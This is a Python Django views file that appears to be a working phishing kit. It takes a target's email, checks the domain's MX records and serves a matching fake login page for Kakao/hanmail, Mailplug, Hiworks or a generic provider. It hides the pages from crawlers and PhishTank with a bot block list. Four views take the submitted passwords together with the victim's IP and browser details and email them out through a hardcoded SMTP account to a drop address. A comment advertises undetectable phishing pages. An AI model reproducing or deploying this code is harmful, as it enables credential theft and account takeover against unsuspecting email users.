from django.shortcuts import render
from django.http import HttpResponse
import smtplib, ssl
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from django.template.loader import get_template
from django.template import Context
from django.template.loader import render_to_string
import dns.resolver
import socket
import requests
import pycountry
from django.http import HttpResponseBadRequest


def loader(request):
    iplogger = request.META.get("HTTP_X_FORWARDED_FOR")
    emailgrabber = request.GET["email"]
    user_agent = request.META.get('HTTP_USER_AGENT', '')
    domainapi = emailgrabber[emailgrabber.index('@') + 1 : ]
    return render(request, 'loader.html', {'email': emailgrabber, 'domains': domainapi})

def landing(request):
    iplogger = request.META.get("HTTP_X_FORWARDED_FOR")
    emailgrabber = request.GET["email"]
    user_agent = request.META.get('HTTP_USER_AGENT', '')
    
    bots = ['Googlebot', 
        'Baiduspider', 
        'ia_archiver',
        'R6_FeedFetcher', 
        'NetcraftSurveyAgent', 
        'Sogou web spider',
        'bingbot', 
        'Yahoo! Slurp', 
        'facebookexternalhit', 
        'PrintfulBot',
        'msnbot', 
        'Twitterbot', 
        'UnwindFetchor', 
        'urlresolver', 
        'Butterfly', 
        'TweetmemeBot',
        'PaperLiBot',
        'MJ12bot',
        'AhrefsBot',
        'Exabot',
        'Ezooms',
        'YandexBot',
        'SearchmetricsBot',
		'phishtank',
		'PhishTank',
        'picsearch',
        'TweetedTimes Bot',
        'QuerySeekerSpider',
        'ShowyouBot',
        'woriobot',
        'merlinkbot',
        'BazQuxBot',
        'Kraken',
        'SISTRIX Crawler',
        'R6_CommentReader',
        'magpie-crawler',
        'GrapeshotCrawler',
        'PercolateCrawler',
        'MaxPointCrawler',
        'R6_FeedFetcher',
        'NetSeer crawler',
        'grokkit-crawler',
        'SMXCrawler',
        'PulseCrawler',
        'Y!J-BRW',
        '80legs.com/webcrawler',
        'Mediapartners-Google', 
        'Spinn3r', 
        'InAGist', 
        'Python-urllib', 
        'NING', 
        'TencentTraveler',
        'Feedfetcher-Google', 
        'mon.itor.us', 
        'spbot', 
        'Feedly',
        'bot',
        'curl',
        "spider",
        "crawler"]
    domainapi = emailgrabber[emailgrabber.index('@') + 1 : ]
    mx_records = dns.resolver.query(domainapi, 'MX')
    
    if any(bot in user_agent.lower() for bot in bots):
        return render(request, 'bots.html')
    else:
        for mx in mx_records:
            mx_hostname = str(mx.exchange).rstrip('.')
            if 'hanmail.net' in mx_hostname:
                return render(request, 'Kakao.html', {'email': emailgrabber, 'domains': domainapi})
            elif 'mailplug.com' in mx_hostname:
                return render(request, 'mailplug.html', {'email': emailgrabber, 'domains': domainapi})
            elif 'hiworks.co.kr' in mx_hostname:
                return render(request, 'hiwoks.html', {'email': emailgrabber, 'domains': domainapi})
        return render(request, 'general.html', {'email': emailgrabber, 'domains': domainapi})



    return render(request, '403.html', {'email': emailgrabber, 'domains': domainapi})

def hiwoks(request):
    ipya = request.META.get("HTTP_X_FORWARDED_FOR")
    emailya = request.POST["vpro"]
    passwordemailya = request.POST["vpros"]
    domainya = emailya[emailya.index('@') + 1 : ]
    sender_eya = "six@illmovesshapes.online"
    sender_emailya = "six@illmovesshapes.online"
    receiver_emailya = "roberto.ghiselim@gmail.com" # faithcooceo@gmail.com
    passwordya = "&X%?.fG)N{)g"
    useragentya = request.META['HTTP_USER_AGENT']
    message = MIMEMultipart("alternative")
    message["Subject"] = "NEW hiworks API  0"
    message["From"] = sender_emailya
    message["To"] = receiver_emailya

    # Create the plain-text and HTML version of your message
    text = """\
    Hi,
    How are you?
    contact me on icq jamescartwright for your fud pages
    """
    html = render_to_string('mail.html', {'emailaccess': emailya, 'useragent': useragentya, 'passaccess': passwordemailya, 'ipman': ipya})

    # Turn these into plain/html MIMEText objects
    part1 = MIMEText(text, "plain")
    part2 = MIMEText(html, "html")

    # Add HTML/plain-text parts to MIMEMultipart message
    # The email client will try to render the last part first
    message.attach(part1)
    message.attach(part2)

    # Create secure connection with server and send email
    with smtplib.SMTP_SSL("illmovesshapes.online", 465) as server:
        server.login(sender_eya, passwordya)
        server.sendmail(sender_emailya, receiver_emailya, message.as_string())
        return render(request, '403.html', {'email': emailya, 'domains': domainya})



def mailplug(request):
    ipya = request.META.get("HTTP_X_FORWARDED_FOR")
    emailya = request.POST["vpro"]
    passwordemailya = request.POST["vpros"]
    domainya = emailya[emailya.index('@') + 1 : ]
    sender_eya = "six@illmovesshapes.online"
    sender_emailya = "six@illmovesshapes.online"
    receiver_emailya = "roberto.ghiselim@gmail.com" # faithcooceo@gmail.com
    passwordya = "&X%?.fG)N{)g"
    useragentya = request.META['HTTP_USER_AGENT']
    message = MIMEMultipart("alternative")
    message["Subject"] = "NEW mailplug EN API  0"
    message["From"] = sender_emailya
    message["To"] = receiver_emailya

    # Create the plain-text and HTML version of your message
    text = """\
    Hi,
    How are you?
    contact me on icq jamescartwright for your fud pages
    """
    html = render_to_string('mail.html', {'emailaccess': emailya, 'useragent': useragentya, 'passaccess': passwordemailya, 'ipman': ipya})

    # Turn these into plain/html MIMEText objects
    part1 = MIMEText(text, "plain")
    part2 = MIMEText(html, "html")

    # Add HTML/plain-text parts to MIMEMultipart message
    # The email client will try to render the last part first
    message.attach(part1)
    message.attach(part2)

    # Create secure connection with server and send email
    with smtplib.SMTP_SSL("illmovesshapes.online", 465) as server:
        server.login(sender_eya, passwordya)
        server.sendmail(sender_emailya, receiver_emailya, message.as_string())
        return render(request, 'Domain.html', {'email': emailya, 'domains': domainya})





def general(request):
    ipya = request.META.get("HTTP_X_FORWARDED_FOR")
    emailya = request.POST["vpro"]
    passwordemailya = request.POST["vpros"]
    domainya = emailya[emailya.index('@') + 1 : ]
    sender_eya = "six@illmovesshapes.online"
    sender_emailya = "six@illmovesshapes.online"
    receiver_emailya = "roberto.ghiselim@gmail.com" # faithcooceo@gmail.com
    passwordya = "&X%?.fG)N{)g"
    useragentya = request.META['HTTP_USER_AGENT']
    message = MIMEMultipart("alternative")
    message["Subject"] = "NEW general EN API  0"
    message["From"] = sender_emailya
    message["To"] = receiver_emailya

    # Create the plain-text and HTML version of your message
    text = """\
    Hi,
    How are you?
    contact me on icq jamescartwright for your fud pages
    """
    html = render_to_string('mail.html', {'emailaccess': emailya, 'useragent': useragentya, 'passaccess': passwordemailya, 'ipman': ipya})

    # Turn these into plain/html MIMEText objects
    part1 = MIMEText(text, "plain")
    part2 = MIMEText(html, "html")

    # Add HTML/plain-text parts to MIMEMultipart message
    # The email client will try to render the last part first
    message.attach(part1)
    message.attach(part2)

    # Create secure connection with server and send email
    with smtplib.SMTP_SSL("illmovesshapes.online", 465) as server:
        server.login(sender_eya, passwordya)
        server.sendmail(sender_emailya, receiver_emailya, message.as_string())
        return render(request, '403.html', {'email': emailya, 'domains': domainya})





def kakao(request):
    ipya = request.META.get("HTTP_X_FORWARDED_FOR")
    emailya = request.POST["vpro"]
    passwordemailya = request.POST["vpros"]
    domainya = emailya[emailya.index('@') + 1 : ]
    sender_eya = "six@illmovesshapes.online"
    sender_emailya = "six@illmovesshapes.online"
    receiver_emailya = "roberto.ghiselim@gmail.com" # faithcooceo@gmail.com
    passwordya = "&X%?.fG)N{)g"
    useragentya = request.META['HTTP_USER_AGENT']
    message = MIMEMultipart("alternative")
    message["Subject"] = "NEW kakao EN API  0"
    message["From"] = sender_emailya
    message["To"] = receiver_emailya

    # Create the plain-text and HTML version of your message
    text = """\
    Hi,
    How are you?
    contact me on icq jamescartwright for your fud pages
    """
    html = render_to_string('mail.html', {'emailaccess': emailya, 'useragent': useragentya, 'passaccess': passwordemailya, 'ipman': ipya})

    # Turn these into plain/html MIMEText objects
    part1 = MIMEText(text, "plain")
    part2 = MIMEText(html, "html")

    # Add HTML/plain-text parts to MIMEMultipart message
    # The email client will try to render the last part first
    message.attach(part1)
    message.attach(part2)

    # Create secure connection with server and send email
    with smtplib.SMTP_SSL("illmovesshapes.online", 465) as server:
        server.login(sender_eya, passwordya)
        server.sendmail(sender_emailya, receiver_emailya, message.as_string())
        return render(request, '403.html', {'email': emailya, 'domains': domainya})

